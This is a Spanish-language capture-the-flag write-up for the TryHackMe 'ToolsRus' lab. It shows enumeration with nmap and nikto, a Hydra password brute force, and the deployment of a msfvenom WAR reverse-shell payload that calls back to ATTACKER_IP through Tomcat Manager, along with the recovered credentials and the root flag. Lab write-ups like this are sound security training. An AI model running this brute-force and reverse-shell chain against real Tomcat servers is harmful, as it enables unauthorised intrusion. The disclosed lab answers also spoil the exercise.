# ToolsRus — Informe Técnico

## Información de la Sala

| Campo | Valor |
|---|---|
| Plataforma | TryHackMe |
| Sala | ToolsRus |
| Dificultad | Fácil |
| Temas | Enumeración, Hydra, Nikto, Explotación Tomcat, Reverse Shell |

---

# Objetivo

Obtener acceso a la máquina objetivo mediante enumeración de servicios, descubrimiento de credenciales válidas, explotación del panel Tomcat Manager y acceso root al sistema.

---

# Reconocimiento

## Escaneo con Nmap

Se realizó una enumeración inicial para identificar servicios y puertos abiertos.

### Comando

```bash
nmap -sC -sV -p- TARGET_IP
```

### Hallazgos

| Puerto | Servicio | Versión |
|---|---|---|
| 80 | HTTP | Apache Tomcat |
| 1234 | HTTP | Tomcat Manager |

---

# Enumeración Web

Se utilizó Nikto para identificar directorios, métodos HTTP peligrosos y paneles administrativos expuestos.

### Comando

```bash
nikto -h http://TARGET_IP:1234
```

### Hallazgos

- Interfaz Tomcat Manager expuesta
- Método PUT habilitado
- Método DELETE habilitado
- Páginas por defecto de Tomcat accesibles
- Versión de Apache Tomcat identificada

---

# Fuerza Bruta de Credenciales

Se utilizó Hydra contra el recurso protegido HTTP.

### Comando

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt TARGET_IP http-get /protected/
```

### Credenciales Encontradas

| Usuario | Contraseña |
|---|---|
| bob | bubbles |

---

# Acceso a Tomcat Manager

Con las credenciales obtenidas se logró acceso al panel Tomcat Manager.

### Comando

```bash
curl -u bob:bubbles http://TARGET_IP:1234/manager/html
```

La interfaz permitía desplegar archivos WAR.

---

# Generación del Payload

Se generó un payload WAR malicioso utilizando msfvenom.

### Comando

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war
```

---

# Listener Reverse Shell

Se inició un listener con Netcat en la máquina atacante.

### Comando

```bash
nc -lvnp 4444
```

---

# Explotación

El archivo WAR fue subido mediante la sección de despliegue del Tomcat Manager.

Tras acceder a la aplicación desplegada, se ejecutó el payload y se estableció una reverse shell.

---

# Acceso Inicial

La reverse shell fue recibida correctamente.

### Verificación

```bash
whoami
```

### Resultado

```bash
root
```

---

# Obtención de la Flag

La flag root fue localizada dentro del directorio `/root`.

### Comandos

```bash
cd /root
ls
cat flag.txt
```

### Flag

```text
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

---

# Resumen del Ataque

1. Enumeración de servicios con Nmap
2. Descubrimiento de Tomcat Manager con Nikto
3. Ataque de fuerza bruta con Hydra
4. Acceso al panel Tomcat Manager
5. Generación de payload WAR
6. Subida del payload malicioso
7. Ejecución de reverse shell
8. Obtención de acceso root
9. Captura de la flag

---

# Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| Nmap | Enumeración de servicios |
| Nikto | Enumeración web |
| Hydra | Fuerza bruta de credenciales |
| Curl | Verificación HTTP |
| msfvenom | Generación de payload |
| Netcat | Listener reverse shell |

---

# Habilidades Practicadas

- Enumeración web
- Ataques de credenciales
- Explotación Tomcat
- Gestión de reverse shells
- Navegación Linux
- Reconocimiento de servicios

---

# Lecciones Aprendidas

- Las credenciales débiles siguen siendo un riesgo crítico.
- Exponer Tomcat Manager puede derivar directamente en ejecución remota de código.
- La enumeración correcta es fundamental antes de explotar.
- El despliegue de archivos WAR puede proporcionar acceso inmediato al sistema.

---

# Conclusión

La máquina fue comprometida exitosamente mediante la explotación de Tomcat Manager utilizando credenciales débiles. Se obtuvo acceso root completo y se recuperó la flag final correctamente.
